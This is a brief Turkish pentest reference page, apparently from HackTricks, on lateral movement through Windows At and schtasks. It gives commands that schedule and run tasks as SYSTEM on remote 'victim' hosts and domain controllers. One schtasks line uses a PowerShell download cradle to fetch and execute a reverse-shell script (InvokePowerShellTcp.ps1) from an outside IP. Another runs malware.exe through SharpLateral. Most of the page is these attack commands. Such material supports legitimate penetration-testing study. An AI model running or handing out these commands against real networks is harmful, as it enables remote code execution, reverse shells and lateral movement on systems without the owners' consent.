# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl Çalışır

At, kullanıcı adı/(şifre/Hash) bildiğiniz hostlarda görevleri planlamanıza olanak tanır. Böylece, diğer hostlarda komutlar çalıştırmak ve çıktıyı almak için bunu kullanabilirsiniz.
```
At \\victim 11:00:00PM shutdown -r
```
schtasks kullanarak önce görevi oluşturmanız ve ardından çağırmanız gerekir:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Ayrıca [SharpLateral](https://github.com/mertdas/SharpLateral) kullanabilirsiniz:
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Daha fazla bilgi için [**schtasks kullanımına ilişkin gümüş biletler burada**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
